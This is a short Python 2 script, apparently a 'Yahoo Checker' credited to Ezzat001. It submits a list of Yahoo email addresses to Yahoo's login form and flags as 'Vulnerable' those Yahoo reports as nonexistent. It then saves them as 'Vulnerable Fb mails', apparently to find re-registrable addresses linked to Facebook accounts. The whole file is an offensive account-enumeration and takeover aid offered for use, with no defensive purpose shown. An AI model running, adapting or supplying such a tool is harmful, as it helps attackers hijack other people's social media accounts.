# encoding=utf8
# Author: Zen-Oh-Sama - Developed by Ezzat (Yahoo Checker)
import requests, json, os, re, sys, mechanize, random
os.system("clear")
print('Developed By Ezzat001, https://fb.com/ezzat001')
file_name = str(raw_input('Enter the File Name (ex: list.txt) : '))
class YC:
    def __init__(self,mail_list):
        br = mechanize.Browser()
        br.set_handle_robots(False)
        self.non_vuln_list = []
        self.vuln_list = []
        for email in mail_list:
            try:
                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
                br._factory.is_html = True
                br.select_form(nr=0)
                br["username"] = email
                j = br.submit().read()
                Zen = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    cd = Zen.search(j).group()
                except Exception as e:
                    #print(e)
                    vuln = ("\033[31mNot Vulnerable")

                    createable = False
                    self.non_vuln_list.append(email)
                    print ("\033[36m| " + email + "\033[36m| "+ vuln +" \033[36m|")
                    continue
                if ('"messages.ERROR_INVALID_USERNAME">' in cd):
                    creatable = True
                    vuln = ("\033[32mVulnerable")
                    self.vuln_list.append(email)
                else:
                    createable = False
                    vuln = ("\033[31mNot Vulnerable")
                    #Email Len
                    self.non_vuln_list.append(email)
                print ("\033[36m| " + email + "\033[36m| " + vuln + " \033[36m|")
            
            except KeyError:
                continue
check_list = []
x = open(file_name,'r')
for i in x.readlines():
    if 'yahoo.com' not in i:
        pass
    else:
        check_list.append(i.replace('\n',''))
yc = YC(check_list)
randnum = random.randint(1000,9999)
vuln_mails = open('mails'+str(randnum)+'.txt','w')
for i in yc.vuln_list:
    vuln_mails.write(str(i)+'\n')

print('Vulnerable Fb mails is Saved in mails'+str(randnum)+'.txt')
